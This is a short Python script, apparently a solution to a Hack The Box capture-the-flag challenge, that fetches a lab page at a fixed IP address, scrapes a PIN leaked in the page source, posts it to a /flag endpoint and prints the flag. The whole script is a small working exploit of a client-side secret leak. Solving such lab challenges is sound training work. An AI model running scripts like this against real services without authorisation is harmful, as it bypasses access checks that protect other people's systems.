import requests
import re

host, port = "94.237.57.115", 54123

url = f'http://{host}:{port}'

response = requests.get(url)

code = re.search(r'correctPin:\s*"(\d+)"',response.text).group(1)

data = {
    "pin": code
}

flag_request = requests.post(f'{url}/flag',json=data)

flag = re.search(r'HTB\{.*?\}', flag_request.text)

print(flag.group())